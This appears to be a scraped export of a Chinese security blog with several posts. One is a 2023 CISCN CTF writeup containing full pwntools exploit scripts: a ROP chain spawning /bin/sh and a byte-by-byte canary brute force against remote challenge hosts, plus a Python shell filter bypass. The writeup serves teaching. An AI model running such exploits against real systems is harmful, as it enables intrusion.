Galsworthy\n我很多时候使用vim就是写个脚本文件或者改个配置什么的，最好是需要用的时候马上就可以用，主打一个方便\n然而我又是一个离不开自动补全的人，虽然没有自动补全也能写，但是那个体验\u0026hellip;\n然后我就试了一下vim的各种补全插件\u0026hellip;一言难尽\n因为有些插件安装过程极其复杂，而且往往依赖项都要最新的，如果需要在新系统或者老旧版本的系统上安装耗费精力极大，而且其体验往往不如vscode，其浪费的时间精力超过vscode两三倍（况且vscode又不是没有vim插件，虽然很简陋就是了）\n然后经过一番搜索，我发现了这个项目，使用纯vim脚本来调用vim本身自带的自动补全功能，什么依赖都不需要，复制到~/.vimrc就可以了！\n这个项目就是GitHub - skywind3000/vim-auto-popmenu: Display the Completion Menu Automantically (next AutoComplPop) !!\n如果向我一样懒惰，什么插件都不想安装，希望配置新环境的时候只需要一个.vimrc文本文件就能完美符合要求，就把vim-auto-popmenu/apc.vim at master · skywind3000/vim-auto-popmenu · GitHub内的全部内容复制到~/.vimrc中，然后加上：\n\u0026#34; enable this plugin for filetypes, \u0026#39;*\u0026#39; for all files. let g:apc_enable_ft = {\u0026#39;*\u0026#39;:1} \u0026#34; source for dictionary, current or other loaded buffers, see \u0026#39;:help cpt\u0026#39; set cpt=.,k,w,b \u0026#34; don\u0026#39;t select the first item. set completeopt=menu,menuone,noselect \u0026#34; suppress annoy messages. set shortmess+=c 搞定！\n","date":"2023年06月04日","permalink":"https://peterliuzhi.top/posts/%E5%A6%82%E4%BD%95%E5%9C%A8vim%E4%B8%AD%E5%90%AF%E7%94%A8%E8%87%AA%E5%B8%A6%E7%9A%84%E8%A1%A5%E5%85%A8%E5%8A%9F%E8%83%BD/","section":"posts","summary":"Love has no age, no limit; and no death. — John Galsworthy 我很多时候使用vim就是写个脚本文件或者改个配置什么的，最好是需要用的时候马上就可以用，主打一个方便 然而我又是一个离不开自动补","tags":["杂谈","vim"],"title":"如何在vim中启用自带的补全功能"},{"categories":["posts","开发","C/C++网络编程"],"contents":" One may say the eternal mystery of the world is its comprehensibility. — Albert Einstein\n学习资料 非常感谢大佬的教程~简单易懂~我推荐和我一样打算入门socket并快速上手的同学都看一看~\n文字教程：套接字 - Socket | 爱编程的大丙 B站视频教程：并发网络通信-套接字通信(C/C++ 多线程) 相关的理论知识在这些资料里面已经说的很清楚了，我这里就不再赘述了，仅仅简单地说一说TCP协议下的通信流程\n通信流程 是时候祭出这张图了，图源https://subingwen.cn/linux/socket/tcp.jpg\n简单来说，就是服务器要先建立套接字（表现为一个用于监听的文件描述符）并将socket文件描述符绑定连接端口，然后监听连接端口是否有新的客户端试图连接（listen设置端口监听，accept阻塞地等待客户端连接），然后假如有客户端通过这个端口连接，accept就取消阻塞，同时设置一个结构体（struct sockaddr_in），我们可以通过这个结构体知道客户端的相关信息；同时accept还会返回一个用于通信的文件描述符，我们可以通过这个文件描述符来与客户端使用recv/send通信。最后如果客户端有序关闭了（orderly shutdown）了，那么recv就会返回0，这时我们就知道客户端结束连接了（如果出现错误就会返回-1并设置errno）\n然后客户端就比较简单，只需要建立socket文件描述符，在通过connect连接既定的IP:port后直接向这个socket文件描述符进行读写（recv/send）就可以了\n如何查看相关API 非常建议使用Linux的man命令查看！虽然是英文的，但是对于正在使用的系统是绝对权威的，而且无需联网，速度很快！\n如果你想使用vim查看man手册（因为你的vim可能设置了习惯的快捷键），在此自荐我写的脚本，可以使用vim在man、tldr、cppman之间查询：使用vim在man、tldr、cppman库间搜索帮助手册并打开 - P3troL1er 的个人博客\n完整代码 因为我写了详细的注释，所以我就不再赘述一遍了，如果对api有疑问建议使用man手册查看\n下面是完整的C语言代码，本来是想写C++代码的，但是由于教程是C语言的，不知不觉几乎完全是C-style的代码，索性就直接写成C语言代码了\nserver.c:\n#include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;pthread.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; // 几个宏用来防止手动写入过多错误判断代码 #define CKE(EXP) do {\\ if ((EXP) == -1) {\\ fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, #EXP, strerror(errno));\\ exit(127+errno);\\ }\\ } while(0) #define CKEN(EXP) do {\\ if ((EXP) != 0) {\\ fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, #EXP, strerror(errno));\\ exit(127+errno);\\ }\\ } while(0) // 用来保存通信线程所需的相关信息 typedef struct{ int cfd; // 通信的文件描述符 struct sockaddr_in details; // 客户端的相关信息 socklen_t details_len; // 上面那个结构体的长度，如果通信线程调用recvfrom就可以用到 char ip[16]; // 保存客户端的IP字符串 int port; // 保存客户端的端口 } netfd; static void* communicate(void* arg){ // 通过强制转换 netfd* netinfo = (netfd*)arg; // 每个已连接的通信线程都有1kb的缓冲区 char buf[1024] = {0}; // 固定的回复 const char* response = \u0026#34;server\u0026#39;s spell...\u0026#34;; // TODOrecv \u0026amp; send while (true) { // 获取收到的字节数量 int len = recv(netinfo-\u0026gt;cfd, buf, sizeof(buf), 0); /** 关于recv的返回值，可以参考Linux的man手册： These calls return the number of bytes received, or -1 if an error occurred. In the event of an error, errno is set to indicate the error. When a stream socket peer has performed an orderly shutdown, the return value will be 0 (the traditional \u0026#34;end-of-file\u0026#34; return). Datagram sockets in various domains (e.g., the UNIX and Internet domains) permit zero-length datagrams. When such a datagram is received, the return value is 0. The value 0 may also be returned if the requested number of bytes to receive from a stream socket was 0. */ if (len \u0026gt; 0) { printf(\u0026#34;client from %s:%d sent: %s\\n\u0026#34;, netinfo-\u0026gt;ip, netinfo-\u0026gt;port, buf); send(netinfo-\u0026gt;cfd, response, sizeof(char) * (strlen(response) + 1), 0); } else if (len == 0) { // TODO接收到客户端终止连接请求 puts(\u0026#34;the client has ended the connection...\u0026#34;); break; } else { // 接收到错误就打印出来，并且退出线程 fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, \u0026#34;recv()\u0026#34;, strerror(errno)); close(netinfo-\u0026gt;cfd); pthread_exit((void*)((long)127+errno)); } // 一定要设置buf为0，不然可能和新信息混杂在一起 // 因为buf被初始化为0，所以memset放在循环末尾 memset(buf, 0, sizeof(buf)); } // 当客户端正常退出时就关闭通信的文件描述符 close(netinfo-\u0026gt;cfd); pthread_exit((void*)((long)0)); } static void sig_int(int signo){ printf(\u0026#34;thread %ld received: %s\\n\u0026#34;, pthread_self(), strsignal(signo)); puts(\u0026#34;server exiting...\u0026#34;); exit(signo); } int main(int argc, char const *argv[]) { // 声明局部变量 int lfd; pthread_attr_t tid_attr; pthread_t tid; int err; struct sockaddr_in server_addr; // 保存服务器的相关信息 const int connection_num = 128; // 设置最大连接数 // 设置信号处理函数 signal(SIGINT, sig_int); // TODO设置监听的套接字 // 设置TCP协议 CKE(lfd = socket(AF_INET, SOCK_STREAM, 0)); // TODO绑定端口 server_addr.sin_family = AF_INET; // from host byte order to network byte order server_addr.sin_port = htons(10000); // 代表本机的任意地址 // 或者设置其中一个IP，使用inet_pton将IP地址字符串转换为二进制格式 // inet_pton - convert IPv4 and IPv6 addresses from text to binary form server_addr.sin_addr.s_addr = INADDR_ANY; CKE(bind(lfd, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr))); // TODO设置端口监听 CKE(listen(lfd, connection_num)); // 初始化线程属性，设置为线程启动即分离 CKEN((err = pthread_attr_init(\u0026amp;tid_attr))); CKEN((err = pthread_attr_setdetachstate(\u0026amp;tid_attr, PTHREAD_CREATE_DETACHED))); // TODO开始接收连接请求 // 阻塞直到有客户端连接 // 在栈空间中保存该结构体的大小，因为后面的api需要传指针进去，可能会更改这个值 // 不停地检测是否有连接 // 如果没有连接就阻塞 while (true) { // 这个结构体包括了传给线程的参数，因此不能是局部变量，可以在堆上分配 netfd* netinfo = (netfd*)malloc(sizeof(netfd)); netinfo-\u0026gt;details_len = sizeof(netinfo-\u0026gt;details); /** On success, these system calls return a file descriptor for the accepted socket (a nonnegative integer). On error, -1 is returned, errno is set appropriately, and addrlen is left unchanged. */ CKE(netinfo-\u0026gt;cfd = accept(lfd, (struct sockaddr*)\u0026amp;(netinfo-\u0026gt;details), \u0026amp;(netinfo-\u0026gt;details_len))); // 此时应该已经收到了客户端的相关信息 netinfo-\u0026gt;port = ntohs(netinfo-\u0026gt;details.sin_port); // 打印客户端相关信息 printf( \u0026#34;client\u0026#39;s IP: %s, port: %d\\n\u0026#34;, inet_ntop(AF_INET, \u0026amp;(netinfo-\u0026gt;details.sin_addr.s_addr), netinfo-\u0026gt;ip, netinfo-\u0026gt;details_len), netinfo-\u0026gt;port ); // 创建信息 CKEN(err = pthread_create(\u0026amp;tid, \u0026amp;tid_attr, communicate, (void*)netinfo)); } // TODO关闭两个端口 // 在主线程只用关闭监听的文件描述符 close(lfd); return 0; } client.c:\n#include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define CKE(EXP) do {\\ if ((EXP) == -1) {\\ fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, #EXP, strerror(errno));\\ exit(127+errno);\\ }\\ } while(0) int main(int argc, char const *argv[]) { // 声明局部变量 int fd; char buf[1024] = {0}; // TODO 建立套接字 CKE(fd = socket(AF_INET, SOCK_STREAM, 0)); // TODO 建立连接 // 设置服务器地址、端口 struct sockaddr_in server_addr; server_addr.sin_family = AF_INET; server_addr.sin_port = htons(10000); inet_pton(AF_INET, \u0026#34;127.0.0.1\u0026#34;, \u0026amp;(server_addr.sin_addr.s_addr)); CKE(connect(fd, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr))); //TODO send \u0026amp; recv for(int i = 0; i \u0026lt; 100; i++) { int num = snprintf(buf, sizeof(buf)/sizeof(char)-1, \u0026#34;Massage NO.%d\u0026#34;, i); send(fd, buf, sizeof(char)*(num+1), 0); memset(buf, 0, sizeof(buf)); if ((num = recv(fd, buf, sizeof(buf), 0)) \u0026gt; 0) { printf(\u0026#34;server respond: %s\\n\u0026#34;, buf); }else if (num == 0) { puts(\u0026#34;the server has ended its service...\u0026#34;); break; }else { fprintf(stderr, \u0026#34;[EXIT ERROR] %s raise error: %s\\n\u0026#34;, \u0026#34;recv()\u0026#34;, strerror(errno)); exit(127+errno); } sleep(1); } // TODO 关闭连接 close(fd); return 0; } 效果图：\n","date":"2023年06月04日","permalink":"https://peterliuzhi.top/posts/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95cc++%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%88%9D%E6%AD%A5/","section":"posts","summary":"One may say the eternal mystery of the world is its comprehensibility. — Albert Einstein 学习资料 非常感谢大佬的教程~简单易懂~我推荐和我一样打算入门socket并快速上手的同学都看一看~ 文字教程：套接字 - Socket |","tags":["C/C++","网络编程","socket","套接字"],"title":"【学习记录】C/C++网络编程初步"},{"categories":["posts"],"contents":" Real magic in relationships means an absence of judgement of others. — Wayne Dyer\n很久之前写了一组专用于pwn的docker构建文件，包含Ubuntu16、Ubuntu18、Ubuntu20、Ubuntu22，后来对其进行了更改但是因为懒一直没有更新，今天更新一下然后顺便在博客推荐一下\n注意，使用我的dockerfile一定要设置共享文件夹（当然如果你不想可以在docker-compose.yml）中删除相应的语句，同时我也推荐大家设置共享文件集，因为这样四个docker的工作目录就是实时互通的，相互切换极其方便\n同时，我不建议在Windows上搭建pwn docker，虽然我原本写这个dockerfile是在Windows上搭建的，但是经过一段时间使用还是放弃了。原因之一是vscode进行ssh远程连接的时候每一个docker都要重新下载一遍插件，一共就是下载4次，而有些时候vscode插件在天朝不是很好下载。有人可能会问，既然都有共享文件夹了，我直接在Windows上打开vscode不就好了？非也，最重要的一点就是pwntools没有Windows版本。因此我还是建议创建一个虚拟机，然后在虚拟机中搭建docker，然后vscode连接这个虚拟机的共享文件夹就好了。\n项目目录在此，欢迎下载与star！\n","date":"2023年06月04日","permalink":"https://peterliuzhi.top/posts/%E6%8E%A8%E4%B8%80%E4%B8%8B%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84pwn-docker-build-files/","section":"posts","summary":"Real magic in relationships means an absence of judgement of others. — Wayne Dyer 很久之前写了一组专用于pwn的docker构建文件，包含Ubuntu16、Ubuntu18、Ubuntu20、Ubuntu","tags":["pwn","docker"],"title":"推一下自己写的pwn docker build files"},{"categories":["writeup"],"contents":" It is not so important to know everything as to appreciate what we learn. — Hannah More\n[原题链接](https://buuoj.cn/challenges#2023 ciscn pwn\u0026amp;misc小部分题解)\n对现在的我来说还是太难了……继续努力吧……只做出来一点点题目\npwn 烧烤摊儿 整形溢出得到大量金钱后收购烧烤摊，然后通过scanf(\u0026quot;%s\u0026quot;)的溢出来控制程序执行流\nfrom pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = True fn: str = \u0026#34;./shaokao\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;41169\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] # env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;47.95.212.224\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c b* 0x401FAD c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) sendline_after_clean(\u0026#34;1\u0026#34;) sendline_after_clean(\u0026#34;1\u0026#34;) sendline_after_clean(\u0026#34;-100000\u0026#34;) sendline_after_clean(\u0026#34;4\u0026#34;) sendline_after_clean(\u0026#34;5\u0026#34;) name = 0x4E60F0 sh_str = b\u0026#34;/bin/sh\\x00\u0026#34; pop_rdi_ret = 0x000000000040264f pop_rsi_ret = 0x000000000040a67e pop_rdx_ret = 0x00000000004a404b pop_rax_ret = 0x0000000000458827 syscall_ret = 0x00000000004230a6 payload = sh_str.ljust(0x28, b\u0026#34;\\x00\u0026#34;) + pg(pop_rsi_ret) + pg(0) + pg(pop_rdx_ret) + pg(0) + pg(0) + pg(pop_rax_ret) + pg(59) + pg(0x0000000000457014) + pg(syscall_ret) sendline_after_clean(payload) interactive_after_clean() funcanary 一个字节一个字节地爆破canary，获得canary后爆破函数地址第四位\nfrom pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = True fn: str = \u0026#34;./funcanary\u0026#34; libc_name:str = \u0026#34;\u0026#34; port: str = \u0026#34;12729\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] # env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;123.56.236.235\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c b* 0x401FAD c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) # libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) cnt = 0 this_byte = 0xff base_payload = b\u0026#34;a\u0026#34;*0x68 func_byte = 0x2 while(True): # payload = b\u0026#34;a\u0026#34;*0x68 + pg(cnt) + pg(0) + b\u0026#34;\\x28\\x12\u0026#34; if cnt \u0026lt; 8: payload = base_payload + p8(this_byte) else: payload = base_payload + pg(0) + p8(0x28) + p8(func_byte) send_after_clean(payload, no_show=False) received = p.clean(0.5) if cnt \u0026lt; 8: if b\u0026#34;terminated\u0026#34; in received: this_byte -= 1 continue else: base_payload += p8(this_byte) this_byte = 0xff cnt += 1 continue else: if b\u0026#34;flag\u0026#34; in received: print(received) interactive_after_clean() else: func_byte += 0x10 misc 签到卡 说白了就是试一试flag的路径在哪里\nprint(open(\u0026#34;/flag\u0026#34;).read()) pyshell 不知道它这个shell是怎么过滤的，一旦涉及到敏感词就会返回nop，然后调用函数括号里面好像只能写_或者什么都不写\n但是它好像只是对当前的输入进行过滤，那么我们可以使用_来引用上一个变量，然后使用字符串拼接逐字符地拼出'open(\u0026quot;/flag\u0026quot;).read()'，然后使用eval(_)进行调用：\n\u0026#34;o\u0026#34; + \u0026#34;p\u0026#34; _ + \u0026#34;e\u0026#34; ... _ + \u0026#34;)\u0026#34; eval(_) ","date":"2023年05月28日","permalink":"https://peterliuzhi.top/writeup/2023-ciscn-pwnmisc%E5%B0%8F%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/","section":"writeup","summary":"It is not so important to know everything as to appreciate what we learn. — Hannah More [原题链接](https://buuoj.cn/challenges#2023 ciscn pwn\u0026amp;misc小部分题解)","tags":["pwn"],"title":"2023 ciscn pwn\u0026misc小部分题解"},{"categories":["tricks"],"contents":" Technological progress has merely provided us with more efficient means for going backwards. — Aldous Huxley\n这里我是写了一个bash脚本，只需要使用命令viman -e 函数/命令名就能自动在man/cppman间搜索。之所以写这个脚本最主要的动机是cppman里将cppman的数据导入man失败了并且不知道怎么修复\u0026hellip;并且man自带的编辑器（文本浏览器？）不好用，并且还想集成tldr\n项目目录见GitHub - PeterLiu-all/viman: 在命令行和vim中查看Linux manual，数据库包括man、cppman、tldr\n注意，想要使用该脚本必须先下载cppman和tldr：\npip3 install cppman sudo apt install -y tldr tldr --update # 如有需要，可以缓存cppman的离线数据库 # 笔者花了几个小时才下载完，而且可能是代码问题经常卡死，需要手动重启 cppman -c 接下来就是脚本了，使用方法（注意-e是必须的）：\n# 普通使用 viman -e 名称 # 显示帮助 viman -h # 使用tldr viman -t -e 名称 然后将下面的脚本保存为文件viman:\n#!/bin/bash echo \u0026#34;--Written By P3troL1er--\u0026#34; echo \u0026#34;\u0026gt; Welcome to my blog: https://peterliuzhi.top\u0026#34; cppman -v \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026gt;/dev/null if [ $? -ne 0 ];then echo \u0026#34;Can\u0026#39;t find cppman!\u0026#34; 1\u0026gt;\u0026amp;2 python3 -m pip install cppman if [ $? -ne 0 ];then echo \u0026#34;ERROR found when installing cppman!\u0026#34; 1\u0026gt;\u0026amp;2 echo \u0026#34;used command to install: python3 -m pip install cppman\u0026#34; 1\u0026gt;\u0026amp;2 echo \u0026#34;try to find out that if the command is not available on your system!(check if you have python3 and pip)\u0026#34; 1\u0026gt;\u0026amp;2 exit 127 fi fi tldr -v \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026gt;/dev/null if [ $? -ne 0 ];then echo \u0026#34;Can\u0026#39;t find tldr!\u0026#34; 1\u0026gt;\u0026amp;2 sudo apt install tldr -y if [ $? -ne 0 ];then echo \u0026#34;ERROR found when installing tldr!\u0026#34; 1\u0026gt;\u0026amp;2 echo \u0026#34;used command to install: sudo apt install tldr -y\u0026#34; 1\u0026gt;\u0026amp;2 echo \u0026#34;try to find out that if the command is not available on your system!(check if you are using debian-based system like Ubuntu)\u0026#34; 1\u0026gt;\u0026amp;2 exit 127 fi fi function help_guide(){ echo \u0026#34;USAGE: $0 [OPTIONS] -e MAN_ENTRY\u0026#34; echo \u0026#34;HELP: $0 -h\u0026#34; echo \u0026#34;USE_TLDR: $0 -t -e MAN_ENTRY\u0026#34; echo \u0026#34;BY P3troL1er\u0026#34; } helper=0 NORMAL_MAN=\u0026#34;man\u0026#34; use_tldr=0 entry_name=\u0026#34;\u0026#34; while getopts \u0026#34;hte:\u0026#34; opt; do case $opt in h) helper=1 ;; t) NORMAL_MAN=\u0026#34;tldr\u0026#34; use_tldr=1 ;; e) entry_name=$OPTARG ;; \\?) echo \u0026#34;Invalid option: -$OPTARG\u0026#34; \u0026gt;\u0026amp;2 help_guide exit 1 ;; esac done if [ $helper -eq 1 ]; then help_guide exit 0 fi VIMAN_ARG=`mktemp /tmp/viman.temp.XXXXXX` RETURN_MSG=`$NORMAL_MAN $entry_name \u0026gt;\u0026gt; $VIMAN_ARG` VIMAN_EXITCODE=$? if [ -n \u0026#34;$RETURN_MSG\u0026#34; ]; then VIMAN_EXITCODE=16 fi if [ $VIMAN_EXITCODE -eq 0 ]; then if [ $use_tldr -eq 1 ]; then vim $VIMAN_ARG -c \u0026#34;:term ++curwin cat %\u0026#34; else vim $VIMAN_ARG -c \u0026#34;set nonumber\u0026#34; fi else echo \u0026#34;$NORMAL_MAN failed! using cppman...\u0026#34; RETURN_MSG=`cppman \u0026#34;$entry_name\u0026#34;` if [ -n \u0026#34;$RETURN_MSG\u0026#34; ];then echo 